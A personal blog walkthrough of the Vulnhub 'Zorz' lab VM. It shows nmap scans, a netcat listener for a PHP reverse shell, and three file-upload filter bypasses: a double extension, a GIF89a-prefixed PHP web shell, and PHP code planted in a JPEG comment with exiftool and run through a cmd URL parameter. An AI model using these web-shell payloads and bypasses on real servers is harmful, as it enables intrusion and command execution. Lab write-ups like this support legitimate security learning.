<p>I have been playing around with another vulnerable VM, this one is called Zorz, and can be found <a href="https://www.vulnhub.com/entry/tophatsec-zorz,117/">here</a> on vulnhub. It is made by <a href="https://www.top-hat-sec.com/r4v3ns-blog/another-vm-challenge-zorz">Top-hat-sec</a>.</p>
<p>First I imported the VM, but it automatically used eth0, instead of wlan. So once that was changed I could find the machine when I did my scan.</p>
<p>[code]<br />
nmap -v 192.168.1.1/24<br />
[/code]<br />
I have started running nmap in verbose mode, because it can be fun to see how nmap is working, and especially if it is really slow, and I start to doubt that everything is really working as it should.</p>
<p>[code]<br />
sudo nmap -A -T4 -p- 192.168.1.104<br />
[/code]</p>
<p>So this stands for -A: Aggressive, and it includes: OS detection, version detection, script scanning, and traceroute. </p>
<p>-T4 is how fast the scanning should be. -T4 is "aggressive", but not -T5 "insane". So it works out fast, but still reliable. Although it doesn't really matter. I think it is more useful when you need to scan hundreds of networks. In how much of a hurry you are. Granted T0 is slooow. -T3 is the default.</p>

<p>Okay, so we just have ssh and 80. Let's start ZAP and Dir-browsing, because that can take some time. And let that roll while we checkout the browser.</p>
<h2>Challenge 1</h2>
<p>So we find three challenges. Three ways to upload images to the server. So I guess that we want to bypass the image-restrictions and upload shells instead.</p>
<p>The first one was really straight-forward. It didn't really do any check. So I could just upload php-reverse-shell.php without any problems. But where was the file? I continued to play with Challenge 2 and 3. On the third one it says where the file was uploaded. It was uploaded into a dir called uploads3. So I figured the files for challenge 1 and 2 were to be found in uploads1 and uploads 2.</p>
<p>So I opened port 1234 in the firewall with the command:<br />
[code]<br />
ufw allow 1234<br />
[/code]<br />
And then I used netcat to start listening in on that port, and get ready for the shell.<br />
[code]<br />
nc -v -l 1234<br />
[/code]<br />
So -v stands for verbose. -l for listen. So that netcat know that it should listed for a incoming connection, and not establish connection itself. 1234 is the port that it should listen to.<br />
Now we just click on the shell-file in uploads1 and the server connects to netcat.</p>
<p>So year, this was pretty easy. Basically no check whatsoever.</p>
<h2>Challenge 2</h2>
<p>Now it is getting a bit more difficult. We cannot upload file that does not end with .png, .jpg, .gif.</p>
<p>But instead we can just rename our shell and upload it as shell.php.jpg. It passed the filter and the file is executed as php.</p>
<h2>Challenge 3<br />
This challenge was a bit harder. Because somehow it was checking to see if the file itself was an image. I found to ways to bypass this check.<br />
From this <a href="http://www.securityidiots.com/Web-Pentest/hacking-website-by-shell-uploading.html">great tutorial</a> I learned how to get around it. Basically you just add the text "GIF89a;" before you shell-code. So it would look something like this:</p>
<p>[code lang="php"]<br />
GIF89a;<br />
&lt;?<br />
system($_GET['cmd']);//or you can insert your complete shell code<br />
?&gt;<br />
[/code] </p>
<p>So that worked and I managed to get a shell up and running. </p>
<p>The second way to beat this challenge is to add the shell-code into a comment of a image-file.</p>
<p>First I looked for a simple jpg file online "jpg file:jpg". And then I inserted the php-code into the image comment with the following command.</p>
<p>[code]<br />
exiftool -Comment='&lt;?php echo &quot;&lt;pre&gt;&quot;; system($_GET['cmd']); ?&gt;' lo.jpg<br />
[/code]</p>
<p>Exiftool is a great tool to view and manipulate exif-data.<br />
Then I had to rename the file<br />
[code]<br />
mv lo.jpg lo.php.jpg<br />
[/code]<br />
Then upload it. When I then click on it the browser just outputs jibberish.<br />
[code]<br />
http://zorz.dev/uploads1/lo.php.jpg?cmd=ls<br />
[/code]<br />
So when we run this in the browser it outputs the result on the webpage. So yeah, we have a shell.</p>
<p>Then we can move to<br />
http://zorz.dev/uploads1/lo.php.jpg?cmd=cat%20/var/www/html/l337saucel337/SECRETFILE<br />
And see the win-file.</p>
<p>There are many more tricks to bypass fileupload restrictions. Here are some:<br />
